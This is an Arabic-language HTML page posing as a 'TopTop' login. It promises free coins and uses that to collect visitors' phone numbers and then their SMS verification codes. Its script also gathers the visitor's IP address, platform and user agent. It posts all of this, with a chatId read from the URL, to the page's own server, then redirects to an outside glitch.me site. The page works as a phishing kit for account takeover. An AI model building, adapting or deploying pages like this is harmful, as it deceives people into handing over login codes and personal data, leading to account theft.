<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول لـ TopTop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        h1, h2 {
            color: #333;
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input, select, button {
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
        .pricing-option {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px 0;
        }
        .message {
            background-color: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message" id="message"></div>
        
        <div id="login-container">
            <h1>تسجيل الدخول لـ TopTop</h1>
            <form id="loginForm" onsubmit="event.preventDefault(); sendPhoneNumber();">
                <label for="country">اختر الدولة:</label>
                <select id="country" name="country" required>
                    <option value="">-- اختر الدولة --</option>
                    <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
                    <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
                    <!-- يمكنك إضافة المزيد من الدول هنا -->
                </select>
                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
                <input type="hidden" id="chatId" name="chatId">
                <button type="submit">إرسال رقم الهاتف</button>
            </form>
        </div>

        <div id="verification-container" style="display:none;">
            <h1>إدخال كود التحقق</h1>
            <form id="verificationForm" onsubmit="event.preventDefault(); verifyCode();">
                <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الكود" required>
                <button type="submit">تأكيد الدخول</button>
            </form>
        </div>

        <div class="pricing-section">
            <h2>أسعار أكوانزات TopTop</h2>
            <div class="pricing-option">
                <span>1000 أكوانز - 0$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">مجاني</button>
            </div>
            <div class="pricing-option">
                <span>2000 أكوانز - 2$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
            </div>
            <div class="pricing-option">
                <span>5000 أكوانز - 5$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
            </div>
            <div class="pricing-option">
                <span>10000 أكوانز - 10$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
            </div>
        </div>
    </div>

    <script>
        let globalPhoneNumber = '';
        let globalCountry = '';

        function getChatIdFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('chatId');
        }

        document.addEventListener('DOMContentLoaded', function() {
            const chatId = getChatIdFromUrl();
            if (chatId) {
                document.getElementById('chatId').value = chatId;
            }
        });

        function showMessage(message) {
            var messageElement = document.getElementById('message');
            messageElement.innerText = message;
            messageElement.style.display = 'block';
            setTimeout(function() {
                messageElement.style.display = 'none';
            }, 3000);
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city
                };
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    city: 'Unknown'
                };
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            let platform = "Unknown";
            if (/Windows/.test(ua)) platform = "Windows";
            else if (/Mac/.test(ua)) platform = "MacOS";
            else if (/Linux/.test(ua)) platform = "Linux";
            else if (/Android/.test(ua)) platform = "Android";
            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";

            return {
                platform: platform,
                userAgent: ua
            };
        }

        async function sendPhoneNumber() {
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const country = document.getElementById('country').value;
            const chatId = document.getElementById('chatId').value;

            if (!phoneNumber) {
                showMessage('يرجى إدخال رقم الهاتف');
                return;
            }

            if (!country) {
                showMessage('يرجى اختيار الدولة');
                return;
            }

            if (!chatId) {
                console.error('معرف المحادثة غير موجود');
                showMessage('حدث خطأ. يرجى تحديث الصفحة والمحاولة مرة أخرى.');
                return;
            }

            globalPhoneNumber = phoneNumber;
            globalCountry = country;

            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();

            try {
                const response = await fetch('/sendPhoneNumber', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phoneNumber,
                        country,
                        chatId,
                        ip: ipInfo.ip,
                        platform: platformInfo.platform,
                        userAgent: platformInfo.userAgent
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const result = await response.json();
                if (result.success) {
                    showMessage('تم إرسال رمز التحقق');
                    document.getElementById('login-container').style.display = 'none';
                    document.getElementById('verification-container').style.display = 'block';
                } else {
                    showMessage(result.message || 'حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقًا.');
            }
        }

        async function verifyCode() {
            const verificationCode = document.getElementById('verificationCode').value.trim();
            const chatId = document.getElementById('chatId').value;

            if (!verificationCode) {
                showMessage('يرجى إدخال كود التحقق');
                return;
            }

            if (!globalPhoneNumber || !globalCountry || !chatId) {
                showMessage('حدث خطأ. يرجى تحديث الصفحة والمحاولة مرة أخرى.');
                return;
            }

            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();

            try {
                const response = await fetch('/verifyCode', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        verificationCode,
                        phoneNumber: globalPhoneNumber,
                        country: globalCountry,
                        chatId,
                        ip: ipInfo.ip,
                        platform: platformInfo.platform,
                        userAgent: platformInfo.userAgent
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const result = await response.json();
                if (result.success) {
                    showMessage('تم التحقق من الكود بنجاح');
                    setTimeout(() => {
                        window.location.href = "https://polarized-believed-fisherman.glitch.me/";
                    }, 3000);
                } else {
                    showMessage(result.message || 'فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقًا.');
            }
        }
    </script>
</body>
</html>
